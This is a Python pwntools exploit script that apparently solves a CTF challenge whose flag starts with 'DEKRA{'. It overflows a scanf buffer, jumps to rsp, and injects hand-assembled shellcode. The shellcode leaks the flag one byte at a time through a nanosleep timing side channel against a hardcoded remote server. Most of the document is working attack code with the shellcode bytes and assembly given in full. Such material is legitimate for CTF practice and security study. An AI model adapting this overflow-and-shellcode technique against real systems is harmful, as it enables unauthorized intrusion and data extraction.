# RazviOverflow
# Python3

from pwn import *
import time
import sys

# The binary uses scanf to read infinite amount of bytes starting @ rbp-0x40
jmp_rsp = p64(0x004011c6)
padding = b"A"*0x40 + b"B"*0x8
payload = padding + jmp_rsp 

#flag_address = int(binary.recv().split(b"@")[1].strip().replace(b".",b""),16)

'''
The idea is to test every byte of the flag against a given range and check whether it is between
that range. If it is, the program will sleep. If it is not, it will immediately exit. 

The range is 0x21 to 0x73 (all printable characters)

The address of the flag is in r13 when main ends (rets).

Allowed syscalls are:
read
exit_group
fstat
exit
lseek
nanosleep

http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+++++ebx%2C+0x45%0D%0Asub+++++ebx%2C+0x45%0D%0Amovzx+++eax%2C+byte+ptr+%5Br13+%2B+rbx%5D%0D%0Acmp+++++al%2C+0x75%0D%0Ajne++++++0x401210%0D%0Axor+++++rsi%2C+rsi%0D%0Apush++++rsi%0D%0Apush++++3%0D%0Apush++++rsp%0D%0Apop+++++rdi%0D%0Apush++++0x23%0D%0Apop+++++rax%0D%0Asyscall+%0D%0Ajmp+++++0x401210&arch=x86-64&as_format=inline#assembly
mov     ebx, 0x45
sub     ebx, 0x45
movzx   eax, byte ptr [r13 + rbx]
cmp     al, 0x75
jne      0x401210
xor     rsi, rsi
push    rsi
push    3
push    rsp
pop     rdi
push    0x23
pop     rax
syscall 
jmp     0x401210


0x0000000000000000:  BB DF 00 00 00       mov     ebx, 0xdf
0x0000000000000005:  83 EB 45             sub     ebx, 0x45
0x0000000000000008:  41 0F B6 44 1D 00    movzx   eax, byte ptr [r13 + rbx]
0x000000000000000e:  3C DF                cmp     al, 0xdf
0x0000000000000010:  0F 85 FA 11 40 00    jne     0x401210
0x0000000000000016:  48 31 F6             xor     rsi, rsi
0x0000000000000019:  56                   push    rsi
0x000000000000001a:  6A 03                push    3
0x000000000000001c:  54                   push    rsp
0x000000000000001d:  5F                   pop     rdi
0x000000000000001e:  6A 23                push    0x23
0x0000000000000020:  58                   pop     rax
0x0000000000000021:  0F 05                syscall 
0x0000000000000023:  E9 E8 11 40 00       jmp     0x401210

"\xbb\xdf\x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c\xdf\x0f\x85\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"

'''

# If the byte to guess is between the given range, the binary will sleep 3 seconds. 
def shellcode(iteration, guessing_byte):
	#shellcode = b"\x41\x0F\xB6\x45" + chr(iteration).encode("utf-8") + b"\x3C" + chr(superior_range).encode("utf-8") + b"\x0F\x8F\x00\x00\x00\x00\x41\x0F\xB6\x45" + chr(iteration).encode("utf-8")+ b"\x3C" + chr(inferior_range).encode("utf-8") + b"\x0F\x8E\x00\x00\x00\x00\x48\x31\xF6\x56\x6A\x03\x54\x5F\x6A\x23\x58\x0F\x05\xE9\x00\x00\x00\x00"
	#shell_code = b"\x41\x0f\xb6\x45" + chr(iteration).encode("utf-8") + b"\x3C" + chr(superior_range).encode("utf-8") + b"\x0f\x8f\x03\x12\x40\x00\x41\x0f\xb6\x45" + chr(iteration).encode("utf-8")+ b"\x3C" + chr(inferior_range).encode("utf-8") + b"\x0f\x8c\xf6\x11\x40\x00\x48\x31\xf6\x56\x6a\x02\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe4\x11\x40\x00"
	#"\xbb\x45\x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c\x75\x0f\x85\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"
	# "				\xbb		\x45 						  \x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c 				\x75 						  \x0f\x85\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"

	# "\xbb\xdf\x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c\xdf\x0f\x8c\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"
	shell_code = b"\xbb" + chr(iteration).encode("utf-8") + b"\x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c" + chr(guessing_byte).encode("utf-8") + b"\x0f\x85\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"

	#shell_code = b"\xbb" + chr(iteration).encode("utf-8") + b"\x00\x00\x00\x83\xeb\x45\x41\x0f\xb6\x44\x1d\x00\x3c" + chr(guessing_byte).encode("utf-8") + b"\x0f\x8c\xfa\x11\x40\x00\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\xe9\xe8\x11\x40\x00"
	
	return shell_code

# Iteration starts at 6 because the beginning of the flag is DEKRA{

'''
with open("pythoninput", "wb") as file:
	shell = shellcode(10, 0x45,0x45)
	print(shell)
	file.write(payload + shell)
'''

flag = "DEKRA{"
guessed_flag = list()

for i in range(30): # 30 possible letters of the flag. Maybe more
	for j in range(0x21, 0x7F): # from 0x21 to 0x7e
		#print("Testing - " + str(hex(j)))
		#binary = process("./challenge")
		binary = remote("168.119.247.237", 5013)
		# +0x45 because that's the byte I randomly chose to add and then subtract to rbx and use it to move through the flag's bytes to avoid 0xa "\n" and such
		# +6 because we start guessing from that position DEKTRA{ 
		shell_code = shellcode(i+0x45+6, j) 
		starting_time = time.time()
		binary.sendline(payload + shell_code)
		binary.recvall()
		waited_time = time.time() - starting_time
		if waited_time > 2:
			print("Another successful char ->" + chr(j))
			guessed_flag.append(chr(j))
			if chr(j) == '}':
				print("Full flag is ->" + flag + "".join(guessed_flag))
				sys.exit()
			break
		binary.close()
